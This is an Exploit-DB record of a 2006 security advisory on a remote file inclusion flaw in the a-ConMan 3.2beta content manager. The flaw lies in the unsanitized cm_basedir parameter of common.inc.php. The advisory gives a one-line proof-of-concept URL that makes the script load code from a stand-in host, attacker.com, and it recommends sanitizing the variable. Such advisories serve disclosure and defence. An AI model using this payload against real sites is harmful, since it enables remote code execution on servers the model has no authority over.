{
  "id": "2831",
  "title": "a-ConMan 3.2b - &#039;common.inc.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6078",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_61$2006\r\n\r\n------------------------------------------------------------------------------\r\n[ECHO_ADV_61$2006] a-ConMan <= v3.2beta Remote File Inclusion\r\n------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Ahmad Maulana a.k.a Matdhule\r\nDate Found\t: November, 22nd 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv61-matdhule-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\na-ConMan (Automated Content Management)\r\n\r\nApplication\t: a-ConMan (Automated Content Management)\r\nversion\t\t: 3.2beta\r\nURL\t\t: http://sourceforge.net/projects/a-conman\r\n\r\na-ConMan is a flexible database solution built to categorize and manage your image and video content. Giving you the ability to automate the building and updating for any type of content specific website within seconds. Utilizing one of the most advanced\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nI found vulnerability at script common.inc.php\r\n\r\n-----------------------common.inc.php----------------------\r\n....\r\n<?php\r\ninclude_once($cm_basedir.\"/ez_sql.php\");\r\ninclude_once($cm_basedir.\"/pg2ezsql.php\");\r\n// include_once($cm_basedir.\"/functions.php\");\r\n$ver = \"3.1.1228\";\r\n\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"cm_basedir\" parameter in common.inc.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[a-conman_path]/php.incs/common.inc.php?cm_basedir=http://attacker.com/inject.txt?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n- Sanitize variable $cm_basedir on common.inc.php.\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~~\r\n~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson    :)   \r\n~ y3dips,the_day,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous,str0ke\r\n~ bius, lapets, BlueSpy, NpR, h4ntu, thama, Fungky\r\n~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com\r\n~ Solpotcrew Comunity (#nyubicrew @ allindo.net), #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~\r\n \r\n     matdhule[at]gmail[dot]com\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-11-22]",
  "url": "https://www.exploit-db.com/exploits/2831"
}